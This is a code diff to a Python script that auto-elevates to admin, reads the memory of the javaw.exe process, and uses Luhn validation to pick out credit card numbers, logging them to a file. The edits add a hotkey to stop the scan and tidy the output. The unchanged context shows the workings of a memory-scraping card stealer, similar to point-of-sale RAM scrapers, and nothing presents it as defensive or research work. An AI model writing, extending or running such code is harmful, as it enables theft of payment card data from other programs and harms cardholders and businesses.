@@ -7,6 +7,7 @@ import sys
 import time
 import logging
 import subprocess
+import keyboard  # Import keyboard library
 
 # Constants for process access
 PROCESS_VM_READ = 0x0010
@@ -17,6 +18,9 @@ logging.basicConfig(filename='log.txt', level=logging.INFO, format='%(asctime)s 
 
 # Queue for memory regions to scan (for threading)
 memory_queue = Queue()
+
+# Flag to control the scanning process
+running = True
 
 # Luhn's algorithm to validate credit card numbers
 def validate_luhn(card_number):
@@ -101,7 +105,7 @@ def scan_memory_chunk(memory_chunk):
 
 # Worker thread that processes memory chunks
 def memory_scan_worker(process_handle):
-    while True:
+    while running:
         if memory_queue.empty():
             time.sleep(1)  # Avoid busy waiting
             continue
@@ -180,7 +184,7 @@ def scan_process_memory(pid, num_threads=4):
         threads.append(t)
 
     try:
-        while True:
+        while running:
             # Keep scanning new memory regions in a loop
             new_memory_regions = get_memory_regions(pid)
             for region in new_memory_regions:
@@ -201,7 +205,15 @@ def is_admin():
     except:
         return False
 
+def exit_program(e):
+    global running
+    running = False
+    print("Exiting program...")
+
 if __name__ == "__main__":
+    # Register hotkey for Ctrl + Shift + C
+    keyboard.add_hotkey('ctrl+shift+c', exit_program)
+
     if not is_admin():
         print("Attempting to restart with admin privileges...")
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
@@ -209,9 +221,8 @@ if __name__ == "__main__":
 
     for proc in psutil.process_iter(['pid', 'name']):
         if proc.info['name'] == 'javaw.exe':
-            target_pid = proc.info['pid']
-            print(f"Found javaw.exe with PID {target_pid}")
-            scan_process_memory(target_pid)
+            print(f"Found {proc.info['name']} with PID {proc.info['pid']}")
+            scan_process_memory(proc.info['pid'])
             break
     else:
-        print("javaw.exe not found!")
+        print("javaw.exe not found.")
